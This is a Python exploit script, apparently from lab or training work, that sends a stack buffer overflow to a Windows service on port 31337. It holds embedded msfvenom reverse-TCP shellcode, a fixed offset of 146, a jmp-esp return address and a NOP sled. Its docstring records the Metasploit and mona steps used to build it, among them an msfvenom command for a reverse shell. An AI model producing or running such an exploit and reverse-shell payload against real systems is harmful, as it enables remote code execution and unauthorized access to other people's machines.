#!/usr/bin/env python3

r"""
INFO:root:Socket timed out with 203 bytes of data
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 201
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
[*] Exact match at offset 146


msfvenom -p windows/exec CMD="calc.exe" EXITFUNC=thread -a x86 -b "\x00\x0a" -f python -v shellcode
mona cmp -a esp -f C:\Users\IEUser\Desktop\test_chars.bin
!mona jmp -r esp -cpb "\x00\x0A"
msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=443 -f python EXITFUNC=thread -a x86 -b "\x00\x0a" -v SHELLCODE



"""

import logging
import socket
import struct
import sys

logging.basicConfig(level=logging.DEBUG)
RHOST = "192.168.44.153"
RPORT = 31337

# msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=443 -f python EXITFUNC=thread -a x86 -b "\x00\x0a" -v SHELLCODE
SHELLCODE =  b""
SHELLCODE += b"\xbd\xad\xf8\x64\x7b\xdb\xd0\xd9\x74\x24\xf4"
SHELLCODE += b"\x58\x31\xc9\xb1\x5b\x31\x68\x14\x03\x68\x14"
SHELLCODE += b"\x83\xe8\xfc\x4f\x0d\x98\x93\x0d\xee\x61\x64"
SHELLCODE += b"\x71\x66\x84\x55\xb1\x1c\xcc\xc6\x01\x56\x80"
SHELLCODE += b"\xea\xea\x3a\x31\x78\x9e\x92\x36\xc9\x14\xc5"
SHELLCODE += b"\x79\xca\x04\x35\x1b\x48\x56\x6a\xfb\x71\x99"
SHELLCODE += b"\x7f\xfa\xb6\xc7\x72\xae\x6f\x8c\x21\x5f\x1b"
SHELLCODE += b"\xd8\xf9\xd4\x57\xcd\x79\x08\x2f\xec\xa8\x9f"
SHELLCODE += b"\x3b\xb7\x6a\x21\xef\xcc\x22\x39\xec\xe8\xfd"
SHELLCODE += b"\xb2\xc6\x87\xff\x12\x17\x68\x53\x5b\x97\x9b"
SHELLCODE += b"\xad\x9b\x10\x43\xd8\xd5\x62\xfe\xdb\x21\x18"
SHELLCODE += b"\x24\x69\xb2\xba\xaf\xc9\x1e\x3a\x7c\x8f\xd5"
SHELLCODE += b"\x30\xc9\xdb\xb2\x54\xcc\x08\xc9\x61\x45\xaf"
SHELLCODE += b"\x1e\xe0\x1d\x94\xba\xa8\xc6\xb5\x9b\x14\xa9"
SHELLCODE += b"\xca\xfc\xf6\x16\x6f\x76\x1a\x43\x02\xd5\x73"
SHELLCODE += b"\xa0\x2f\xe6\x83\xae\x38\x95\xb1\x71\x93\x31"
SHELLCODE += b"\xfa\xfa\x3d\xc5\x8b\xec\xbd\x19\x33\x7c\x40"
SHELLCODE += b"\x9a\x44\x55\x87\xce\x14\xcd\x2e\x6f\xff\x0d"
SHELLCODE += b"\xce\xba\x6a\x07\x58\x85\xc3\x3b\x1d\x6d\x16"
SHELLCODE += b"\x43\x1c\xd5\x9f\xa5\x4e\x79\xf0\x79\x2f\x29"
SHELLCODE += b"\xb0\x29\xc7\x23\x3f\x16\xf7\x4b\x95\x3f\x92"
SHELLCODE += b"\xa3\x40\x68\x0b\x5d\xc9\xe2\xaa\xa2\xc7\x8f"
SHELLCODE += b"\xed\x29\xe2\x70\xa3\xd9\x87\x62\xd4\xbd\x67"
SHELLCODE += b"\x7a\x25\x28\x68\x10\x21\xfa\x3f\x8c\x2b\xdb"
SHELLCODE += b"\x08\x13\xd3\x0e\x0b\x53\x2b\xcf\x3a\x28\x1a"
SHELLCODE += b"\x45\x03\x46\x63\x89\x83\x96\x35\xc3\x83\xfe"
SHELLCODE += b"\xe1\xb7\xd7\x1b\xee\x6d\x44\xb0\x7b\x8e\x3d"
SHELLCODE += b"\x65\x2b\xe6\xc3\x50\x1b\xa9\x3c\xb7\x1f\xae"
SHELLCODE += b"\xc3\x4a\x08\x17\xac\xb4\x08\xa7\x2c\xde\x88"
SHELLCODE += b"\xf7\x44\x15\xa6\xf8\xa4\xd6\x6d\x51\xad\x5d"
SHELLCODE += b"\xe0\x13\x4c\x62\x29\xf5\xd0\x63\xde\x2e\xe2"
SHELLCODE += b"\x1e\xaf\xd1\x03\xdf\xb9\xb5\x03\xe0\xc5\xcb"
SHELLCODE += b"\x38\x37\xfc\xb9\x7f\x84\xbb\xa2\x9d\x20\xb6"
SHELLCODE += b"\x4a\x38\xa1\x7b\x17\xbb\x1c\xbf\x2e\x38\x94"
SHELLCODE += b"\x40\xd5\x20\xdd\x45\x91\xe6\x0e\x34\x8a\x82"
SHELLCODE += b"\x30\xeb\xab\x86"


def main():

    # configure initial buf size
    buf = b"a" * 146
    buf += struct.pack("<I", 0x080414c3) # eip
    buf += b"\x90" * 50 # NOP sled
    buf += SHELLCODE
    buf += b"c" * (501 - len(buf))

    # configure socket and send data
    try:
        logging.info(f"Connecting to {RHOST}:{RPORT}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        s.connect((RHOST, RPORT))
        logging.info(f"Sending {len(buf)} bytes of data")
        s.send((buf + b"\r\n"))
        s.recv(1024)
        s.close()
        logging.info(f"Socket closed")

    # print results
    except socket.timeout as e:
        logging.info(f"Socket timed out with {len(buf) + 2} bytes of data")

    return


if __name__=="__main__":
    main()
